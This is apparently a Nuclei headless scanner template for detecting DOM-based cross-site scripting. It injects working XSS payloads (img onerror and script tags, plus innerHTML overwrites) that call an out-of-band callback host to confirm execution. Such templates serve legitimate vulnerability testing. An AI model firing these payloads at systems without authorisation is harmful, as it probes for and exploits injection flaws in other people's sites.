headless:
- extractors:
  - group: 0
    part: interactsh_request
    regex:
    - /(fragment|search|innerhtml|docwrite|location)-[a-z0-9]+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  - condition: or
    name: vulnerabilities
    part: extract
    type: word
    words:
    - eval-overridden
    - document-write-found
    - location-injectable
  matchers-condition: or
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitload
  - action: navigate
    args:
      url: '{{BaseURL}}#<img src=x onerror=fetch(''{{callback}}/fragment-{{xss_id}}'')>'
  - action: waitload
  - action: navigate
    args:
      url: '{{BaseURL}}?search=<script>fetch(''{{callback}}/search-{{xss_id}}'')</script>'
  - action: waitload
  - action: script
    args:
      code: "// Find all elements that use innerHTML\nvar elements = document.querySelectorAll('[id],\
        \ [class]');\nfor(var i=0; i<elements.length && i<10; i++) {\n  try {\n  \
        \  var original = elements[i].innerHTML;\n    elements[i].innerHTML = \"<img\
        \ src=x onerror=\\\"fetch('{{callback}}/innerhtml-{{xss_id}}')\\\">\";\n \
        \   // Restore to not break the page\n    setTimeout(() => { elements[i].innerHTML\
        \ = original; }, 100);\n  } catch(e) {}\n}\n"
  - action: wait
    args:
      duration: 2
  - action: script
    args:
      code: "// Check for vulnerable patterns\nvar vulns = [];\n\n// Check for eval\
        \ usage\nif(window.eval.toString().indexOf('[native code]') === -1) {\n  vulns.push('eval-overridden');\n\
        }\n\n// Check for document.write\nvar scripts = document.getElementsByTagName('script');\n\
        for(var i=0; i<scripts.length; i++) {\n  if(scripts[i].innerHTML.includes('document.write'))\
        \ {\n    vulns.push('document-write-found');\n    fetch('{{callback}}/docwrite-{{xss_id}}');\n\
        \  }\n}\n\n// Check for location manipulation\nif(location.href.includes('<')\
        \ || location.hash.includes('<')) {\n  vulns.push('location-injectable');\n\
        \  fetch('{{callback}}/location-{{xss_id}}');\n}\n\nwindow.vulns = vulns;\n"
  - action: extract
    args:
      name: vulnerabilities
      script: window.vulns || []
id: dom-xss-detection
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'Detects DOM-based XSS vulnerabilities by executing JavaScript in a
    real

    browser context and monitoring for successful payload execution.

    '
  name: DOM XSS Detection with Real Browser Execution
  reference:
  - https://owasp.org/www-community/attacks/xss/
  - https://portswigger.net/web-security/cross-site-scripting/dom-based
  severity: high
  tags: xss,dom,headless,injection
variables:
  callback: '{{interactsh-url}}'
  xss_id: '{{randstr}}'
